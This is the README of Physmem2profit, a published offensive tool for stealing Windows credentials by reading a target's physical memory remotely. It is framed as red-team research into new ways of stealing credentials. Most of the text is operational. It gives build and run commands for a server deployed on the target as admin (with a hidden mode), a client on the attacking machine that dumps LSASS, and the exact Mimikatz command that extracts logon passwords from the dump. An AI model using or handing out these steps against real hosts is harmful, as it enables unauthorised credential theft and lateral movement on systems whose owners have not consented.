# Physmem2profit

Physmem2profit can be used to create a minidump of a target host's LSASS process by analysing physical memory remotely. The intention of this research is to propose an alternative approach to credential theft and create a modular framework that can be extended to support other drivers that can access physical memory. Physmem2profit generates a minidump (.dmp) of LSASS that can be further analyzed with Mimikatz. The tool does not require Cobalt Strike but should work fine over beacon with a SOCKS proxy.

The idea is illustrated below:

![Overview of Physmem2profit](docs/physmemlayout.png)

The tool has two components:

1. The C# server component, `physmem2profit.exe`, executed on the target host
    * Loads the Winpmem driver and acts as a server, which exposes the physical RAM of the target host through a TCP port
1. The client, `physmem2profit` Python module, executed on the attacking machine
    * When executed with `--mode mount`, connects to the target machine and mounts the physical RAM of the target as a raw file with the help of [FUSE](https://en.wikipedia.org/wiki/Filesystem_in_Userspace)
    * When executed with `--mode dump`, calls various [Rekall](https://github.com/google/rekall) plugins to analyze the memory image and to generate a minidump of the LSASS process.
    * When executed with `--mode all`, performs both of the above actions. Connection with server will be closed when dump is complete.

## Installation Instructions

1. Clone the Physmem2profit Git repository: `git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git`
1. For the server running on the target computer:
    1. Build `physmem2profit/server/Physmem2profit.sln` with Visual Studio
1. For the client running on the attacking machine:
    1. `bash physmem2profit/client/install.sh`

## Usage

1. Run `physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]` on the target as admin.
    * You can download the signed Winpmem driver [here](https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys). This driver needs to be present on the target host.
1. Run `source physmem2profit/client/.env/bin/activate` on the attacking machine. This command will activate the virtualenv created by `install.sh`.
1. Run `cd physmem2profit/client` and ```python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]``` on the attacking machine
    * `physmem2profit.exe` needs to be running on the target machine before you run this command.
    * This will write the LSASS minidump to `output/[label]-[date]-lsass.dmp` on the attacking machine.
1. Copy the minidump to a Windows system and run `mimikatz.exe "sekurlsa::minidump [label]-[date]-lsass.dmp" "sekurlsa::logonpasswords" "exit"`

## More Information
[Rethinking Credential Theft](https://labs.f-secure.com/blog/rethinking-credential-theft/) | a blog post explaining why this approach to credential theft was chosen.

Physmem2profit is developed by [b3arr0](https://twitter.com/b3arr0) and [@TimoHirvonen](https://twitter.com/TimoHirvonen).
